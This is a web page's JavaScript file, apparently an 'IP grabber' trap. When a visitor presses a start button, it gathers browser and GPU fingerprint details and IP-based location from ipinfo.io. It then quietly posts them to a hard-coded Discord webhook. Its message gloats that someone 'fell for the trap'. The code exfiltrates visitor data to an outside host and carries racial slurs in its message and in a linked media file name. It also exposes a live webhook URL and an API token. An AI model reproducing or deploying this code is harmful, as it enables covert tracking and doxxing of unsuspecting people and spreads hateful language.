(function() {
    function getWebGLInfo() {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) {
            return { 'GPU': 'Not available' };
        }
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return {
            'GPU Vendor': gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
            'GPU Renderer': gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
    }

    function getDeviceInfo() {
        return {
            'Browser': navigator.userAgent,
            'Platform': navigator.platform,
            'Language': navigator.language,
            'Screen Resolution': `${window.screen.width}x${window.screen.height}`,
            'Available Screen Size': `${window.screen.availWidth}x${window.screen.availHeight}`,
            'Color Depth': `${window.screen.colorDepth}-bit`,
            'Device Memory (Approx)': navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Not available',
            'Time Zone': Intl.DateTimeFormat().resolvedOptions().timeZone,
            'Online Status': navigator.onLine ? "Online" : "Offline",
            'Cookies Enabled': navigator.cookieEnabled,
            'JavaScript Enabled': true,
            'Referrer': document.referrer || 'None'
        };
    }

    function displayDeviceInfo(deviceData) {
        const info = Object.assign(getDeviceInfo(), getWebGLInfo(), deviceData);
        const deviceInfoDiv = document.getElementById('deviceInfo');
        const entries = Object.entries(info);

        entries.forEach(([key, value]) => {
            const infoLine = document.createElement('div');
            infoLine.className = 'info-line';
            infoLine.textContent = `${key}: ${value}`;
            deviceInfoDiv.appendChild(infoLine);
        });

        sendToWebhook(info, 'https://discord.com/api/webhooks/1316455762490560614/wP4p5NOQ9s7Dd6yQhweQR-CY_gjlf10PI9fI4Jl9l9sdBMjiJhJIO7qW8ICDJSHeu0vK');
    }

    async function fetchIPInfo() {
        try {
            const response = await fetch('https://ipinfo.io/json?token=284d70a8a57e5a');
            const data = await response.json();
            return {
                'IP Address': data.ip,
                'City': data.city,
                'Region': data.region,
                'Country': data.country,
                'Location (Lat, Lon)': data.loc,
                'ISP': data.org
            };
        } catch (error) {
            return {
                'IP Address': 'Unable to fetch IP',
                'Geolocation': 'Unable to fetch location',
            };
        }
    }

    async function init() {
        const ipData = await fetchIPInfo();
        displayDeviceInfo(ipData);
    }

    document.getElementById('startButton').addEventListener('click', function() {
        // Hide the button container
        document.querySelector('.button-container').style.display = 'none';
        
        // Show the info container
        document.getElementById('infoContainer').style.display = 'block';
        
        // Add the background image to the body when the button is clicked
        document.body.style.backgroundImage = "url('https://cdn.discordapp.com/attachments/1285984262138499167/1316451792556654624/NIGGER.mp4.mp4?ex=675b18c5&is=6759c745&hm=aeca7b542ca51f813180109a68f441b65637bae6ae0a734bf6559ab47abd180f&')";
        document.body.style.backgroundSize = 'cover';  // Make sure it covers the full screen
        document.body.style.backgroundPosition = 'center';  // Center the background image

        // Start background music
        const music = document.getElementById('backgroundMusic');
        music.play();

        // Call your init function to fetch device info
        init();
    });

    function sendToWebhook(info, webhookURL) {
        const payload = {
            content: "another nigga fell for the trap :sob:",
            embeds: [{
                title: "Device Information",
                description: Object.entries(info).map(([key, value]) => `**${key}**: ${value}`).join("\n"),
                color: 3447003
            }]
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(payload)
        }).then(response => {
            if (response.ok) {
                console.log('sent');
            } else {
                console.error('failed');
            }
        }).catch(error => {
            console.error('Error:', error);
        });
    }
})();
